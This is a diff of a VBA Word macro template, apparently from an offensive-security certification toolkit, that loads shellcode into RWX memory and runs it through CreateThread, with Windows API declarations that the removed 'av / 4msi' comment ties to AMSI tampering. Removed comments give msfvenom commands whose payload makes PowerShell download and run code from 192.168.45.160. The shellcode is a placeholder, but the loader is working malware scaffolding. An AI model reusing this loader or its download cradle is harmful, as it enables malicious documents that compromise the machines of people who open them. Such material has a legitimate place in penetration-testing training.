@@ -1,14 +1,11 @@
-' https://github.com/hackinaggie/OSEP-Tools-v2/blob/main/Macros/WordMacroRunner.vbs
+
 //####DEFINE####
-'av / 4msi
-Public Declare PtrSafe Function EnumProcessModulesEx Lib "psapi.dll" (ByVal hProcess As LongPtr, lphModule As LongPtr, ByVal cb As LongPtr, lpcbNeeded As LongPtr, ByVal dwFilterFlag As LongPtr) As LongPtr
-Public Declare PtrSafe Function GetModuleBaseName Lib "psapi.dll" Alias "GetModuleBaseNameA" (ByVal hProcess As LongPtr, ByVal hModule As LongPtr, ByVal lpFileName As String, ByVal nSize As LongPtr) As LongPtr
-'std
+Private Declare PtrSafe Function EnumProcessModulesEx Lib "psapi.dll" (ByVal hProcess As LongPtr, lphModule As LongPtr, ByVal cb As LongPtr, lpcbNeeded As LongPtr, ByVal dwFilterFlag As LongPtr) As LongPtr
+Private Declare PtrSafe Function GetModuleBaseName Lib "psapi.dll" Alias "GetModuleBaseNameA" (ByVal hProcess As LongPtr, ByVal hModule As LongPtr, ByVal lpFileName As String, ByVal nSize As LongPtr) As LongPtr
 Private Declare PtrSafe Function getmod Lib "KERNEL32" Alias "GetModuleHandleA" (ByVal lpLibFileName As String) As LongPtr
 Private Declare PtrSafe Function GetPrAddr Lib "KERNEL32" Alias "GetProcAddress" (ByVal hModule As LongPtr, ByVal lpProcName As String) As LongPtr
 Private Declare PtrSafe Function VirtPro Lib "KERNEL32" Alias "VirtualProtect" (lpAddress As Any, ByVal dwSize As LongPtr, ByVal flNewProcess As LongPtr, lpflOldProtect As LongPtr) As LongPtr
 Private Declare PtrSafe Sub patched Lib "KERNEL32" Alias "RtlFillMemory" (Destination As Any, ByVal Length As Long, ByVal Fill As Byte)
-'run
 Private Declare PtrSafe Function CreateThread Lib "KERNEL32" (ByVal SecurityAttributes As Long, ByVal StackSize As Long, ByVal StartFunction As LongPtr, ThreadParameter As LongPtr, ByVal CreateFlags As Long, ByRef ThreadId As Long) As LongPtr
 Private Declare PtrSafe Function VirtualAlloc Lib "KERNEL32" (ByVal lpAddress As LongPtr, ByVal dwSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr
 
@@ -29,35 +26,26 @@ Function JustE()
     Dim res As LongPtr
     
 
-
-    'Call architecture function to determine if we are in 32 bit or 64 bit word. 64 bit returns True.
     ch64Arch = arch()
     
-
-    'payload
     If ch64Arch Then
-        'msfvenom -p windows/x64/exec -f vbapplication CMD="powershell.exe -c (new-object net.webclient).DownloadString('http://192.168.45.160/Exectest')" EXITFUNC=thread
         buf = ####SHELLCODE####
     Else
-        'msfvenom -p windows/exec -f vbapplication CMD="powershell.exe -c (new-object net.webclient).DownloadString('http://192.168.45.160/Exectest')" EXITFUNC=thread
         buf = ####SHELLCODE32####
     End If
 
     //####CALL####
 
-    'Create new space in memory within current process
+
     addr = VirtualAlloc(0, UBound(buf), &H3000, &H40)
-    'Copy shellcode to newly created memory
     For counter = LBound(buf) To UBound(buf)
         data = Hex(buf(counter))
         patched ByVal (addr + counter), 1, ByVal ("&H" & data)
     Next counter
-    'create thread to execute shellcode
     res = CreateThread(0, 0, addr, 0, 0, 0)
 End Function
 
 Function arch() As Boolean
- 'check architecture of current word process
     #If Win64 Then
         arch = True
     #Else
@@ -65,28 +53,7 @@ Function arch() As Boolean
     #End If
 End Function
 
-'Public Function getMyIP(ipcheck As String) As Boolean
-''uses WMI to get all IP's associated with machine.  Each one is then checked against the wildcarded IP/network.  If a match is found, returns True
-'    Dim objWMI As Object
-'    Dim objQuery As Object
-'    Dim objQueryItem As Object
-'    Dim vIpAddress
-'    Dim counter As Integer
-'    Dim ips() As String
-'    Set objWMI = GetObject("winmgmts:\\.\root\cimv2")
-'    Set objQuery = objWMI.ExecQuery("Select * from Win32_NetworkAdapterConfiguration Where IPEnabled = True")
-'    For Each objQueryItem In objQuery
-'        For Each vIpAddress In objQueryItem.ipaddress
-'            If CStr(vIpAddress) Like ipcheck Then
-'                getMyIP = True
-'            End If
-'        Next
-'    Next
-'End Function
 
-
-
-'macro name is test which calls the main method
 Sub test()
     JustE
 End Sub
